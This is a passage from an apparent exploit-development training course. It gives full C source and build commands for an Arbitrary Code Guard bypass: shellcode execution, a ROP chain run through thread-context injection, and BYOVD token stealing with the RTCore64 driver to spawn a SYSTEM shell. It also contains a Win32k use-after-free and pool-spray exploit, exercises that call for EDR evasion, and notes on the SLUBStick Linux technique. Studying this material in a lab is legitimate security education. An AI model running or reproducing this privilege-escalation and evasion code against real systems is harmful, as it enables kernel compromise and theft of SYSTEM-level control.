2. **Blocking JIT Compilation**: Prevents Just-In-Time compilation of JavaScript/WebAssembly
3. **Enforcing W^X (Write XOR Execute)**: Memory pages can be writable OR executable, never both

**Why ACG Forces Data-Only Attacks**:

- Cannot allocate executable memory
- Cannot modify existing code pages
- Cannot use JIT compilation
- Must use code-reuse (ROP/JOP) or data-only attacks

**ACG Bypass Strategies**:

1. **JIT Process Exploitation**: Exploit the separate JIT process (Edge uses isolated JIT process)
2. **UnmapViewOfFile Technique**: Unmap and remap code sections (CVE-2018 technique, patched)
3. **OpenProcess Memory Write**: Write to another process without ACG (CVE-2018, patched)
4. **Data-Only Attacks**: Don't execute code at all — manipulate data structures
5. **Code-Reuse (ROP/JOP)**: Use existing code, don't create new code

```c
// acg_bypass.c
// Arbitrary Code Guard (ACG) Bypass via ROP and Data-Only Attacks
// Compile: rc /fo res\version.res res\version.rc
//          cl src\acg_bypass.c res\version.res /Fe:bin\acg_bypass.exe ntdll.lib advapi32.lib ole32.lib user32.lib /O2 /GS- /I.\headers
// Run: .\bin\acg_bypass.exe

#define SYSCALLS_IMPLEMENTATION
#define EVASION_IMPLEMENTATION
#define BYPASS_IMPLEMENTATION

#include <windows.h>
#include <stdio.h>
#include <time.h>

#include "exploit_common.h"
#include "exploit_utils.h"
#include "evasion.h"
#include "bypass.h"
#include "syscalls.h"
#include "gadget_finder.h"
#include "heap_utils.h"
#include "driver_info.h"
#include "kernel_utils.h"

static HANDLE g_hDevice = INVALID_HANDLE_VALUE;
static KERNEL_OFFSETS g_Offsets = {0};

// KernelRead32/64, KernelWrite32/64 are provided by driver_info.h via
// the RTCore64 primitives (RTCore64Read32/Write32). We wire them through
// the DeviceIoControl-based helpers exposed there.
IMPLEMENT_RTCORE64_PRIMITIVES(g_hDevice)


typedef BOOL (WINAPI *pGetProcessMitigationPolicy_t)(HANDLE, PROCESS_MITIGATION_POLICY, PVOID, SIZE_T);
typedef BOOL (WINAPI *pSetProcessMitigationPolicy_t)(PROCESS_MITIGATION_POLICY, PVOID, SIZE_T);
typedef BOOL (WINAPI *pSetProcessValidCallTargets_t)(HANDLE, PVOID, SIZE_T, ULONG, PCFG_CALL_TARGET_INFO);

static pGetProcessMitigationPolicy_t g_fnGetProcessMitigationPolicy = NULL;
static pSetProcessMitigationPolicy_t g_fnSetProcessMitigationPolicy = NULL;
static pSetProcessValidCallTargets_t g_fnSetProcessValidCallTargets = NULL;

static BOOL IsACGEnabled() {
    if (!g_fnGetProcessMitigationPolicy) return FALSE;

    PROCESS_MITIGATION_DYNAMIC_CODE_POLICY policy = {0};
    if (g_fnGetProcessMitigationPolicy(GetCurrentProcess(),
                                       ProcessDynamicCodePolicy,
                                       &policy,
                                       sizeof(policy))) {
        return policy.ProhibitDynamicCode;
    }

    return FALSE;
}

static BOOL ResolveACGAPIs() {
    HMODULE hK32 = GetModuleHandleA("kernel32.dll");
    if (!hK32) return FALSE;

    g_fnVirtualAlloc = (pVirtualAlloc_t)ResolveAPI(hK32, HashAPI("VirtualAlloc"));
    if (!g_fnVirtualAlloc) g_fnVirtualAlloc = (pVirtualAlloc_t)GetProcAddress(hK32, "VirtualAlloc");

    g_fnVirtualProtect = (pVirtualProtect_t)ResolveAPI(hK32, HashAPI("VirtualProtect"));
    if (!g_fnVirtualProtect) g_fnVirtualProtect = (pVirtualProtect_t)GetProcAddress(hK32, "VirtualProtect");

    g_fnGetProcessMitigationPolicy = (pGetProcessMitigationPolicy_t)GetProcAddress(hK32, "GetProcessMitigationPolicy");
    g_fnSetProcessMitigationPolicy = (pSetProcessMitigationPolicy_t)GetProcAddress(hK32, "SetProcessMitigationPolicy");
    g_fnSetProcessValidCallTargets = (pSetProcessValidCallTargets_t)GetProcAddress(hK32, "SetProcessValidCallTargets");

    return (g_fnVirtualAlloc && g_fnVirtualProtect);
}

static void DemonstrateTraditionalShellcode() {
    printf("\n[*] Demonstrating Traditional Shellcode Execution...\n");

    BYTE shellcode[] = {
        0x48, 0x83, 0xEC, 0x28,                     // sub rsp, 0x28
        0x48, 0x8D, 0x0D, 0x18, 0x00, 0x00, 0x00,   // lea rcx, [rip+cmd] (relative math)
        0x48, 0xC7, 0xC2, 0x05, 0x00, 0x00, 0x00,   // mov rdx, 5 (SW_SHOW)
        0x48, 0xB8, 0,0,0,0,0,0,0,0,                // mov rax, WinExec
        0xFF, 0xD0,                                 // call rax
        0x48, 0x83, 0xC4, 0x28,                     // add rsp, 0x28
        0xC3,                                       // ret
        // cmd string
        'c','a','l','c',0
    };

    HMODULE hK32 = GetModuleHandleA("kernel32.dll");
    PVOID pWinExec = GetProcAddress(hK32, "WinExec");

    *(PVOID*)(shellcode + 20) = pWinExec;

    printf("    Step 1: Allocate RW memory\n");
    PVOID mem = g_fnVirtualAlloc(NULL, sizeof(shellcode),
                                 MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!mem) {
        printf("    - VirtualAlloc failed: 0x%X\n", GetLastError());
        return;
    }
    printf("    + Allocated at 0x%p\n", mem);

    printf("    Step 2: Write shellcode\n");
    memcpy(mem, shellcode, sizeof(shellcode));
    printf("    + Shellcode written (%zu bytes)\n", sizeof(shellcode));

    printf("    Step 3: Change to RX (VirtualProtect)\n");
    DWORD oldProtect;
    if (!g_fnVirtualProtect(mem, sizeof(shellcode), PAGE_EXECUTE_READ, &oldProtect)) {
        DWORD err = GetLastError();
        printf("    - VirtualProtect failed: 0x%X\n", err);
        if (err == 0x5AF) {
            printf("    Reason: ACG blocks transition to executable (STATUS_DYNAMIC_CODE_BLOCKED)\n");
        }
        VirtualFree(mem, 0, MEM_RELEASE);
        return;
    }
    printf("    + Changed to PAGE_EXECUTE_READ\n");

    printf("    Step 4: Execute shellcode\n");
    void (*func)() = (void(*)())mem;
    func();
    printf("    + Shellcode executed (calculator spawned)!\n");

    VirtualFree(mem, 0, MEM_RELEASE);
}

static void DemonstrateACGBlocking() {
    printf("\n[*] Demonstrating ACG Blocking VirtualProtect...\n");

    printf("    Enabling ACG...\n");
    PROCESS_MITIGATION_DYNAMIC_CODE_POLICY policy = {0};
    policy.ProhibitDynamicCode = 1;

    if (g_fnSetProcessMitigationPolicy &&
        g_fnSetProcessMitigationPolicy(ProcessDynamicCodePolicy, &policy, sizeof(policy))) {
        printf("    + ACG enabled\n");
    } else {
        printf("    x  Could not enable ACG (may already be enabled or not supported)\n");
    }

    BOOL acgActive = IsACGEnabled();
    printf("    ACG Status: %s\n\n", acgActive ? "ACTIVE" : "INACTIVE");

    printf("    Test 1: Allocate RWX memory directly\n");
    PVOID mem = g_fnVirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE,
                                 PAGE_EXECUTE_READWRITE);
    if (!mem) {
        printf("    - VirtualAlloc(RWX) blocked by ACG (Error: 0x%X)\n", GetLastError());
    } else {
        printf("    x  VirtualAlloc(RWX) succeeded (ACG not active)\n");
        VirtualFree(mem, 0, MEM_RELEASE);
    }

    printf("\n    Test 2: RW -> RX transition via VirtualProtect\n");
    mem = g_fnVirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (mem) {
        printf("    + Allocated RW memory at 0x%p\n", mem);

        DWORD oldProtect;
        if (!g_fnVirtualProtect(mem, 0x1000, PAGE_EXECUTE_READ, &oldProtect)) {
            DWORD err = GetLastError();
            printf("    - VirtualProtect(RX) blocked by ACG\n");
            printf("    Error: 0x%X", err);
            if (err == 0x5AF) {
                printf(" (STATUS_DYNAMIC_CODE_BLOCKED)");
            }
            printf("\n");
        } else {
            printf("    x  VirtualProtect(RX) succeeded (ACG not active)\n");
        }

        VirtualFree(mem, 0, MEM_RELEASE);
    }

    printf("\n    Test 3: RW -> RWX transition via VirtualProtect\n");
    mem = g_fnVirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (mem) {
        printf("    + Allocated RW memory at 0x%p\n", mem);

        DWORD oldProtect;
        if (!g_fnVirtualProtect(mem, 0x1000, PAGE_EXECUTE_READWRITE, &oldProtect)) {
            printf("    - VirtualProtect(RWX) blocked by ACG (Error: 0x%X)\n", GetLastError());
        } else {
            printf("    x  VirtualProtect(RWX) succeeded (ACG not active)\n");
        }

        VirtualFree(mem, 0, MEM_RELEASE);
    }
}

static void DemonstrateROPBypass() {
    printf("\n[*] Demonstrating ROP-Based Bypass (Code Reuse)...\n");
    printf("    Strategy: Use existing code instead of creating new code\n\n");

    HMODULE hNtdll = GetNtdllHandleFromPEB();
    if (!hNtdll) {
        printf("    [-] Failed to get ntdll.dll\n");
        return;
    }

    PBYTE textStart = NULL;
    DWORD textSize = 0;
    if (!GetTextSection(hNtdll, &textStart, &textSize)) {
        printf("    [-] Failed to get .text section\n");
        return;
    }

    printf("    [+] ntdll.dll base: 0x%p\n", hNtdll);
    printf("    [+] .text section: 0x%p (size: 0x%X)\n\n", textStart, textSize);

    PVOID pop_rcx = NULL, pop_rdx = NULL, pop_r8 = NULL, pop_r9 = NULL;
    printf("    Scanning for ROP gadgets...\n");
    FindPopGadgetsMultiModule(&pop_rcx, &pop_rdx, &pop_r8, &pop_r9);

    if (!pop_rcx || !pop_rdx) {
        printf("    [-] Missing critical gadgets (pop rcx & pop rdx), cannot build ROP chain.\n");
        return;
    }
    printf("    [+] Found pop rcx; ret at 0x%p\n", pop_rcx);
    printf("    [+] Found pop rdx; ret at 0x%p\n", pop_rdx);

    printf("\n    ROP Chain Example (WinExec call):\n");
    printf("    1. pop rcx ; ret          <- lpCmdLine\n");
    printf("    2. pop rdx ; ret          <- uCmdShow (5)\n");
    printf("    3. WinExec address\n");
    printf("    4. ret (ExitThread)\n\n");

    HMODULE hK32 = GetModuleHandleA("kernel32.dll");
    PVOID pWinExec = GetProcAddress(hK32, "WinExec");
    PVOID pExitThread = GetProcAddress(hK32, "ExitThread");

    printf("    [+] Building ROP chain on dynamically allocated stack...\n");
    PVOID fakeStack = g_fnVirtualAlloc(NULL, 0x10000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!fakeStack) return;

    // Properly align stack pointer base
    DWORD64 base_addr = (DWORD64)fakeStack + 0x8000;
    base_addr = (base_addr & ~0xF) + 8;
    DWORD64* rop = (DWORD64*)base_addr;

    char* cmd = (char*)fakeStack;
    strcpy_s(cmd, 32, "calc.exe");

    rop[0] = (DWORD64)cmd;
    rop[1] = (DWORD64)pop_rdx;
    rop[2] = 5; // SW_SHOW
    rop[3] = (DWORD64)pWinExec;
    rop[4] = (DWORD64)pExitThread;
    rop[5] = 0; // Shadow space
    rop[6] = 0;
    rop[7] = 0;
    rop[8] = 0;
    rop[9] = 0;

    printf("    [+] Executing ROP chain via suspended thread context injection...\n");
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pExitThread, NULL, CREATE_SUSPENDED, NULL);
    if (hThread) {
        CONTEXT ctx = {0};
        ctx.ContextFlags = CONTEXT_CONTROL;
        if (GetThreadContext(hThread, &ctx)) {
            ctx.Rip = (DWORD64)pop_rcx;
            ctx.Rsp = (DWORD64)&rop[0];
            SetThreadContext(hThread, &ctx);
            ResumeThread(hThread);
            printf("    [+] Sent thread to execute! Calculator should pop up.\n");
            Sleep(500); // Give it a moment to spawn
        }
        CloseHandle(hThread);
    }
}

static void DemonstrateDataOnlyBypass() {
    printf("\n[*] Demonstrating Data-Only Attack (ACG Bypass)...\n");

    g_hDevice = CreateFileA("\\\\.\\RTCore64",
                           GENERIC_READ | GENERIC_WRITE,
                           0, NULL, OPEN_EXISTING, 0, NULL);

    if (g_hDevice == INVALID_HANDLE_VALUE) {
        printf("    [-] Failed to open RTCore64 device: 0x%X. Skipping because driver is not loaded.\n", GetLastError());
        return;
    }

    printf("    [+] Opened RTCore64 device\n");
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    pNtQuerySystemInformation_t g_fnNtQuerySystemInformation = (pNtQuerySystemInformation_t)GetProcAddress(hNtdll, "NtQuerySystemInformation");
    pRtlGetVersion_t g_fnRtlGetVersion = (pRtlGetVersion_t)GetProcAddress(hNtdll, "RtlGetVersion");

    KERNEL_OFFSETS offsets = {0};
        DWORD64 kernelBase = 0;
    ExploitSetupKernel(&g_Offsets, &kernelBase, TRUE);
    if (!kernelBase) {
        printf("    [-] Failed to leak kernel base\n");
        CloseHandle(g_hDevice);
        return;
    }
    printf("    [+] Kernel base: 0x%llx\n", kernelBase);

    DWORD64 systemEPROCESS = FindPsInitialSystemProcess(kernelBase);
    if (!systemEPROCESS) {
        printf("    [-] Failed to find System EPROCESS\n");
        CloseHandle(g_hDevice);
        return;
    }
    printf("    [+] System EPROCESS: 0x%llx\n", systemEPROCESS);

    DWORD currentPID = GetCurrentProcessId();
    DWORD64 currentEPROCESS = FindEPROCESSByPID(systemEPROCESS, currentPID, &offsets);
    if (!currentEPROCESS) {
        printf("    [-] Failed to find current EPROCESS\n");
        CloseHandle(g_hDevice);
        return;
    }
    printf("    [+] Current EPROCESS (PID %d): 0x%llx\n", currentPID, currentEPROCESS);

    DWORD64 systemToken = 0;
    if (!KernelRead64(systemEPROCESS + offsets.EprocessToken, &systemToken)) {
        printf("    [-] Failed to read System token\n");
        CloseHandle(g_hDevice);
        return;
    }

    printf("    [+] System token: 0x%llx\n", systemToken);
    if (!KernelWrite64(currentEPROCESS + offsets.EprocessToken, systemToken)) {
        printf("    [-] Failed to write System token\n");
        CloseHandle(g_hDevice);
        return;
    }
    printf("    [+] Token stolen successfully! No code execution needed.\n");

    printf("    [+] Spawning SYSTEM shell...\n");
    STARTUPINFOA si = {sizeof(si)};
    PROCESS_INFORMATION pi;
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOW;
    char cmd[] = {'c','m','d','.','e','x','e',0};
    if (CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
        printf("    [+] Spawned cmd.exe (PID: %d) as SYSTEM\n", pi.dwProcessId);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        printf("    [-] Failed to spawn shell: 0x%X\n", GetLastError());
    }

    CloseHandle(g_hDevice);
}

int main() {

    if (!ExploitInitialize(FALSE)) return 1;
    srand((unsigned int)time(NULL));

    printf("=== ACG (Arbitrary Code Guard) Bypass ===\n");
    printf("[*] Technique: ROP Chains + Data-Only Attacks\n");



    if (!ResolveACGAPIs()) {
        printf("[-] API resolution failed\n");
        return 1;
    }
    BOOL acgEnabled = IsACGEnabled();
    printf("[*] Initial ACG Status: %s\n", acgEnabled ? "ENABLED" : "DISABLED");

    if (!acgEnabled) {
        DemonstrateTraditionalShellcode();
    }
    DemonstrateACGBlocking();
    DemonstrateROPBypass();
    DemonstrateDataOnlyBypass();
    return 0;
}
```

**Compile & Run:**

```bash
cd c:\Windows_Mitigations_Lab
rc /fo res\version.res res\version.rc
cl src\acg_bypass.c res\version.res /Fe:bin\acg_bypass.exe ntdll.lib advapi32.lib ole32.lib user32.lib /O2 /GS- /I.\headers
.\bin\acg_bypass.exe
```

### BYOVD for Data-Only Attacks

BYOVD (Bring Your Own Vulnerable Driver) is the most reliable way to establish arbitrary kernel R/W primitives on modern Windows systems with HVCI/VBS enabled. Once you have arbitrary R/W, you can perform data-only attacks without needing to bypass CFG/kCFG(you've already seen code for this in day 1)

### Win32k Driver Exploitation

Win32k UAF, double-free, and heap overflow exploitation. Actively exploited attack surface. This implementation demonstrates real Win32k exploitation patterns using shared headers and production techniques.

```c
// win32k_uaf_exploit.c
// Compile: cl src\win32k_uaf_exploit.c /Fe:bin\win32k_uaf.exe ntdll.lib advapi32.lib user32.lib gdi32.lib /O2 /GS- /I.\headers

#define SYSCALLS_IMPLEMENTATION
#define EVASION_IMPLEMENTATION
#define BYPASS_IMPLEMENTATION

#include <windows.h>
#include <stdio.h>
#include <time.h>

#include "exploit_common.h"
#include "exploit_utils.h"
#include "evasion.h"
#include "bypass.h"
#include "syscalls.h"
#include "driver_info.h"
#include "kernel_utils.h"
#include "heap_utils.h"

#define TYPE_WINDOW  1
#define TYPE_MENU    2
#define TYPE_CURSOR  3
#define TYPE_SETWINDOWPOS 4
#define TYPE_HOOK    5
#define TYPE_CLIPDATA 6
#define TYPE_CALLPROC 7
#define TYPE_ACCELTABLE 8
#define TYPE_DDEACCESS 9
#define TYPE_DDECONV 10
#define TYPE_DDEXACT 11
#define TYPE_MONITOR 12
#define TYPE_KBDLAYOUT 13
#define TYPE_KBDFILE 14
#define TYPE_WINEVENTHOOK 15
#define TYPE_TIMER 16
#define TYPE_INPUTCONTEXT 17

static HWND g_hwndTarget = NULL;
static BOOL g_uafTriggered = FALSE;
static DWORD64 g_tagWndAddress = 0;
static KERNEL_OFFSETS g_Offsets = {0};
static HANDLE g_hDevice = INVALID_HANDLE_VALUE;

IMPLEMENT_RTCORE64_PRIMITIVES(g_hDevice)

static DWORD64 LeakTagWndAddress(HWND hwnd) {
    printf("[*] Leaking tagWND kernel address...\n");

    typedef PVOID (WINAPI *pHMValidateHandle_t)(HWND, int);

    HMODULE hUser32 = GetModuleHandleA("user32.dll");
    if (!hUser32) {
        printf("[-] Failed to get user32.dll handle\n");
        return 0;
    }

    pHMValidateHandle_t HMValidateHandle = (pHMValidateHandle_t)GetProcAddress(hUser32, "HMValidateHandle");
    if (!HMValidateHandle) {
        printf("[-] HMValidateHandle not found (may be patched)\n");
        return 0;
    }

    PVOID tagWndAddr = HMValidateHandle(hwnd, TYPE_WINDOW);
    if (!tagWndAddr) {
        printf("[-] Failed to leak tagWND address\n");
        return 0;
    }

    DWORD64 addr = (DWORD64)tagWndAddr;
    if (!IsValidKernelAddress(addr)) {
        printf("[-] Invalid kernel address: 0x%llx\n", addr);
        return 0;
    }

    printf("[+] tagWND kernel address: 0x%llx\n", addr);
    return addr;
}

LRESULT CALLBACK UafWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
    case WM_DESTROY:
        printf("    [WndProc] WM_DESTROY received\n");
        break;

    case WM_NCDESTROY:
        printf("    [WndProc] WM_NCDESTROY received (tagWND being freed)\n");
        g_uafTriggered = TRUE;
        break;
    }

    return DefWindowProcA(hwnd, msg, wParam, lParam);
}

DWORD WINAPI RaceThread(LPVOID param) {
    HWND hwnd = (HWND)param;

    printf("    [RaceThread] Starting race...\n");

    for (int i = 0; i < 1000; i++) {
        if (!IsWindow(hwnd)) {
            printf("    [RaceThread] Window no longer valid\n");
            break;
        }

        GetWindowLongPtrA(hwnd, GWLP_USERDATA);

        RECT rc;
        GetWindowRect(hwnd, &rc);
        Sleep(0);
    }

    printf("    [RaceThread] Race complete\n");
    return 0;
}

static BOOL SprayWin32kPool() {
    printf("\n[*] Spraying Win32k session pool...\n");

    #define SPRAY_COUNT 5000
    HWND windows[SPRAY_COUNT];
    HBITMAP bitmaps[SPRAY_COUNT];
    HBRUSH brushes[SPRAY_COUNT];
    int windowCount = 0, bitmapCount = 0, brushCount = 0;

    printf("    Phase 1: Pre-spray to fill holes...\n");
    for (int i = 0; i < SPRAY_COUNT / 2; i++) {
        windows[i] = CreateWindowExA(0, "BUTTON", "Spray", WS_CHILD,
                                     0, 0, 10, 10, GetDesktopWindow(), NULL, NULL, NULL);
        if (windows[i]) windowCount++;
    }
    printf("    [+] Pre-sprayed %d windows\n", windowCount);

    printf("    Phase 2: Creating controlled holes...\n");
    for (int i = 0; i < windowCount; i += 2) {
        if (windows[i]) {
            DestroyWindow(windows[i]);
            windows[i] = NULL;
        }
    }

    printf("    Phase 3: Filling holes with target objects...\n");
    for (int i = 0; i < SPRAY_COUNT / 2; i++) {
        bitmaps[i] = CreateBitmap(32, 32, 1, 32, NULL);
        if (bitmaps[i]) bitmapCount++;
    }
    printf("    [+] Sprayed %d bitmaps\n", bitmapCount);

    printf("    Phase 4: Final spray layer...\n");
    for (int i = 0; i < SPRAY_COUNT / 4; i++) {
        brushes[i] = CreateSolidBrush(RGB(0x41, 0x41, 0x41));
        if (brushes[i]) brushCount++;
    }
    printf("    [+] Sprayed %d brushes\n", brushCount);

    printf("[+] Total objects sprayed: %d windows, %d bitmaps, %d brushes\n",
           windowCount, bitmapCount, brushCount);
    printf("[+] Session pool groomed for exploitation\n");

    for (int i = 0; i < windowCount; i++) {
        if (windows[i]) DestroyWindow(windows[i]);
    }
    for (int i = 0; i < bitmapCount; i++) {
        if (bitmaps[i]) DeleteObject(bitmaps[i]);
    }
    for (int i = 0; i < brushCount; i++) {
        if (brushes[i]) DeleteObject(brushes[i]);
    }

    return TRUE;
}

static BOOL TriggerWindowUAF() {
    printf("\n[*] Triggering Win32k window UAF...\n");

    WNDCLASSA wc = {0};
    wc.lpfnWndProc = UafWndProc;
    wc.hInstance = GetModuleHandle(NULL);
    wc.lpszClassName = "Win32kUAF";

    if (!RegisterClassA(&wc)) {
        printf("[-] RegisterClass failed: 0x%X\n", GetLastError());
        return FALSE;
    }

    HWND hwnd = CreateWindowExA(0, "Win32kUAF", "UAF", WS_OVERLAPPEDWINDOW,
                                 0, 0, 200, 200, NULL, NULL, wc.hInstance, NULL);
    if (!hwnd) {
        printf("[-] CreateWindow failed: 0x%X\n", GetLastError());
        UnregisterClassA("Win32kUAF", wc.hInstance);
        return FALSE;
    }

    printf("[+] Window created: 0x%p\n", hwnd);
    g_hwndTarget = hwnd;
    g_uafTriggered = FALSE;

    g_tagWndAddress = LeakTagWndAddress(hwnd);
    if (!g_tagWndAddress) {
        DestroyWindow(hwnd);
        UnregisterClassA("Win32kUAF", wc.hInstance);
        return FALSE;
    }

    printf("[*] Starting race thread...\n");
    HANDLE hThread = CreateThread(NULL, 0, RaceThread, hwnd, 0, NULL);

    SleepJitter(100);
    printf("[*] Destroying window (racing with access thread)...\n");
    DestroyWindow(hwnd);

    WaitForSingleObject(hThread, 2000);
    CloseHandle(hThread);

    UnregisterClassA("Win32kUAF", wc.hInstance);

    if (g_uafTriggered) {
        printf("[+] UAF triggered successfully!\n");
        return TRUE;
    } else {
        printf("[-] UAF not triggered\n");
        return FALSE;
    }
}

static BOOL TriggerMenuUAF() {
    printf("\n[*] Triggering Win32k menu UAF...\n");

    HMENU hMenu = CreateMenu();
    if (!hMenu) {
        printf("[-] CreateMenu failed\n");
        return FALSE;
    }

    printf("[+] Created menu: 0x%p\n", hMenu);

    for (int i = 0; i < 10; i++) {
        char item[32];
        sprintf(item, "Item %d", i);
        AppendMenuA(hMenu, MF_STRING, i+1, item);
    }

    MENUINFO mi = {0};
    mi.cbSize = sizeof(MENUINFO);
    mi.fMask = MIM_APPLYTOSUBMENUS | MIM_STYLE;
    mi.dwStyle = MNS_NOTIFYBYPOS;
    SetMenuInfo(hMenu, &mi);

    DestroyMenu(hMenu);
    printf("[+] Menu destroyed - tagMENU freed\n");

    printf("[*] Spraying session pool to reclaim freed tagMENU...\n");

    #define MENU_SPRAY_COUNT 2000
    HMENU spray[MENU_SPRAY_COUNT];
    int sprayed = 0;

    for (int i = 0; i < MENU_SPRAY_COUNT; i++) {
        spray[i] = CreateMenu();
        if (spray[i]) {
            for (int j = 0; j < 5; j++) {
                AppendMenuA(spray[i], MF_STRING, j, "AAAA");
            }
            sprayed++;
        }
    }

    printf("[+] Sprayed %d menu objects\n", sprayed);

    for (int i = 0; i < sprayed; i++) {
        if (spray[i]) DestroyMenu(spray[i]);
    }

    // just demonstration
    return TRUE;
}

int main() {

    if (!ExploitInitialize(TRUE)) return 1;
    srand((unsigned int)time(NULL));

    printf("=== Win32k UAF Exploitation ===\n");




        printf("[*] Opening RTCore64 device for kernel R/W...\n");
    g_hDevice = CreateFileA("\\\\.\\RTCore64",
                           GENERIC_READ | GENERIC_WRITE,
                           0, NULL, OPEN_EXISTING, 0, NULL);

    if (g_hDevice == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open RTCore64 device: 0x%X\n", GetLastError());
        printf("[-] Win32k UAF can still be triggered, but kernel R/W unavailable\n");
    } else {
        printf("[+] Opened RTCore64 device\n");
    }

    if (!TriggerWindowUAF()) {
        printf("[-] Window UAF trigger failed\n");
    }
    SprayWin32kPool();
    TriggerMenuUAF();

    if (g_hDevice != INVALID_HANDLE_VALUE) {
        printf("[-] HMValidateHandle is patched on modern Windows 11,\n");
        CloseHandle(g_hDevice);
    }else{
        printf("[*] try writing rest of it,\n");
    }

    return 0;
}
```

**Compile & Run:**

```bash
cd c:\Windows_Mitigations_Lab
cl src\win32k_uaf_exploit.c /Fe:bin\win32k_uaf.exe ntdll.lib advapi32.lib user32.lib gdi32.lib /O2 /GS- /I.\headers

# Run as admin
.\bin\win32k_uaf.exe
```

### Practical Exercise

1. **ACG Bypass Lab**:
   - Compile and run `acg_bypass.c` without ACG enabled to see traditional shellcode execution
   - Enable ACG and observe how VirtualProtect blocks RW->RX transitions
   - Analyze the ROP chain construction using existing code gadgets
   - Test the data-only token stealing attack with RTCore64 driver

2. **Win32k UAF Lab**:
   - Compile and run `win32k_uaf_exploit.c` to trigger window UAF
   - Observe the race condition between window destruction and access
   - Analyze the session pool spray technique for heap grooming
   - Test menu UAF variant and compare exploitation reliability

3. **Advanced Challenges**:
   - Modify the ROP chain to call a different API (e.g., CreateProcessA)
   - Implement CFG bypass using SetProcessValidCallTargets
   - Build a complete exploit chain: Win32k UAF -> arbitrary R/W -> token stealing
   - Add evasion techniques to avoid EDR detection of BYOVD

### Key Takeaways

- **ACG Enforcement**: Blocks VirtualAlloc(RWX) and VirtualProtect(RX/RWX) transitions with STATUS_DYNAMIC_CODE_BLOCKED (0x5AF)
- **ROP as ACG Bypass**: Code reuse attacks work because they execute existing code, not new code
- **Thread Context Injection**: ROP chains can be executed via suspended thread context manipulation (Rip/Rsp modification)
- **BYOVD + Data-Only**: Most reliable exploitation technique for 2026 (bypasses HVCI, VBS, CFG/kCFG, ACG)
- **HVCI/VBS Architecture**: VTL1 (Secure Kernel) enforces code integrity via SLAT, but cannot validate semantic meaning of VTL0 data
- **Data-Only Attacks**: Manipulate kernel data structures (EPROCESS.Token, KTHREAD.PreviousMode) without executing shellcode
- **Win32k Attack Surface**: User-mode accessible kernel driver with complex object lifetime management (windows, menus, bitmaps)
- **HMValidateHandle Leak**: user32!HMValidateHandle leaks kernel tagWND addresses (patched on modern Windows 11)
- **Session Pool Spray**: Win32k objects allocated in session pool enable heap grooming for UAF exploitation
- **Race Condition UAF**: Window destruction (WM_NCDESTROY) racing with GetWindowLongPtr creates use-after-free
- **RTCore64.sys Primitives**: Provides arbitrary kernel read/write via IOCTL interface for data-only attacks
- **Token Stealing Technique**: Copy System EPROCESS token to current process without code execution
- **Complete Exploit Chain**: Win32k UAF -> Arbitrary R/W -> EPROCESS manipulation -> SYSTEM shell
- **Production Ready**: Real-world APTs (Lazarus) use BYOVD + data-only attacks (CVE-2024-21338)
- **No Control-Flow Hijacking**: Token stealing bypasses CFG/kCFG/XFG because no indirect calls are made

### Discussion Questions

1. Why does ACG block VirtualProtect(RX) but allow ROP chains to execute?
2. How does thread context injection enable ROP execution without VirtualProtect?
3. Why are data-only attacks more reliable than ROP/JOP in HVCI/VBS environments?
4. What is the difference between VTL0 and VTL1, and why can't VTL1 validate data semantics?
5. How does token stealing bypass CFG/kCFG/XFG and HVCI simultaneously?
6. Why is HMValidateHandle a critical information leak, and how is it patched?
7. What makes Win32k such a popular attack surface compared to other kernel drivers?
8. How does session pool spraying improve UAF exploitation reliability?
9. Why is the race condition between WM_NCDESTROY and GetWindowLongPtr exploitable?
10. How does BYOVD (RTCore64) establish arbitrary kernel R/W primitives?
11. What are the detection opportunities for BYOVD attacks (driver loading, IOCTL patterns)?
12. How does EPROCESS.Token manipulation differ from traditional privilege escalation?
13. Why doesn't Credential Guard prevent token stealing attacks?
14. What are the limitations of data-only attacks (requires existing vulnerability, driver signature)?
15. How can defenders detect EPROCESS manipulation at runtime (kernel callbacks, ETW)?

## Day 6: Linux Day

- **Goal**: Learn SLUBStick for kernel heap exploitation and a bit of eBPF

- **Activities**:
  - _Reading_:
    - [SLUBStick: Exploiting Linux Kernel Slab Allocators](https://www.usenix.org/conference/usenixsecurity24/presentation/maar-slubstick)
    - [Linux SLUB Allocator Internals](https://www.kernel.org/doc/gorman/html/understand/understand011.html)
    - [Cross-Cache Attacks](https://dl.acm.org/doi/10.1145/3719027.3765152)
    - [Understanding Page Spray in Linux Kernel Exploitation](https://www.usenix.org/system/files/usenixsecurity24-guo-ziyi.pdf)
  - _Online Resources_:
    - [SLUBStick GitHub Repository](https://github.com/isec-tugraz/SLUBStick)
    - [Linux Kernel Exploitation Course](https://github.com/xairy/linux-kernel-exploitation)
  - _Lab Setup_:
    - Linux kernel 6.x VM with KGDB
    - GDB with kernel debugging symbols
    - QEMU for kernel debugging
    - Vulnerable kernel module for testing
  - _Exercises_:
    1. SLUB allocator analysis with GDB
    2. SLUBStick implementation
    3. Cross-cache attack with msg_msg
    4. Arbitrary read/write primitives

### Deliverables

- [ ] Analyze SLUB allocator structures with GDB
- [ ] Implement SLUBStick technique (99% success rate)
- [ ] Build cross-cache attack using msg_msg
- [ ] Create arbitrary read/write primitives

### SLUBStick Technique

SLUBStick transforms unreliable cross-cache attacks into deterministic exploitation by leveraging three insights:

1. **CPU pinning**: Pin the exploit thread to a single CPU (`sched_setaffinity`) so all SLUB operations use the same per-cpu slab.
2. **Timing-based slab boundary detection**: Measure `RDTSC` around `kmalloc` (via ioctl) — a spike from ~50 cycles to ~500+ cycles indicates a slab boundary crossing (new pages allocated from buddy allocator).
3. **Controlled page recycling**: Free all objects in the last slab to return its pages to the buddy allocator. Then, create memory pressure to force the buddy allocator to recycle those pages for a different `kmem_cache`. This achieves cross-cache reuse with 99% reliability.

